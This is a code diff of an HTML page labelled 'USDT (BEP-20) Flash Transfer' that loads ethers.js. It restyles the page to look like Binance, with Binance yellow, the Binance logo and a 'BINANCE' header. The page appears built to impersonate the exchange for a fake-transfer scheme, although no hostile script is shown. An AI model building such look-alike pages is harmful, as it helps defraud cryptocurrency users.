@@ -7,9 +7,7 @@
     <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js" defer></script>
     <style>
         :root {
-            --primary-color: #00bcd4; /* Teal/Cyan accent color (if we use it elsewhere) */
-            --header-background: #263238; /* Darker background for header like dtcheck.in */
-            --header-text-color: #ffffff;
+            --binance-yellow: #f0b90b; /* Binance yellow color */
             --background-dark: #121212;
             --background-dark-secondary: #1e1e1e;
             --text-light: #f5f5f5;
@@ -36,16 +34,25 @@
         }
 
         .banner {
-            background-color: var(--header-background); /* Dark background for header */
-            color: var(--header-text-color); /* White text */
-            padding: 20px 0; /* Increased padding for prominence */
+            background-color: var(--binance-yellow);
+            color: #212121; /* Dark text on yellow */
+            padding: 15px 0;
             width: 100%;
             text-align: center;
-            font-size: 1.5em; /* Larger font size for the header text */
+            font-size: 1.8em;
             font-weight: bold;
             box-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
-            margin-bottom: 30px; /* Increased margin below header */
-            border-radius: 0; /* No rounded corners for a sharp header */
+            margin-bottom: 30px;
+            border-radius: 0;
+            border-bottom: 3px solid #d4a709; /* Slightly darker yellow for the border */
+            text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.2); /* Subtle text shadow for 3D */
+        }
+
+        .banner img {
+            width: 30px; /* Adjust size as needed */
+            height: auto;
+            vertical-align: middle; /* Align with text */
+            margin-right: 10px;
         }
 
         .card {
@@ -59,7 +66,7 @@
         }
 
         h2 {
-            color: var(--primary-color); /* Keep the primary color for the card title */
+            color: var(--primary-color);
             margin-bottom: 10px;
             font-size: 2em;
             font-weight: bold;
@@ -151,7 +158,8 @@
 </head>
 <body>
     <div class="banner">
-        USDT (BEP-20) Flash Transfer
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/36/Binance_logo.svg/512px-Binance_logo.svg.png" alt="Binance Logo">
+        BINANCE
     </div>
     <div class="card">
         <h2>USDT (BEP-20) Transfer</h2>
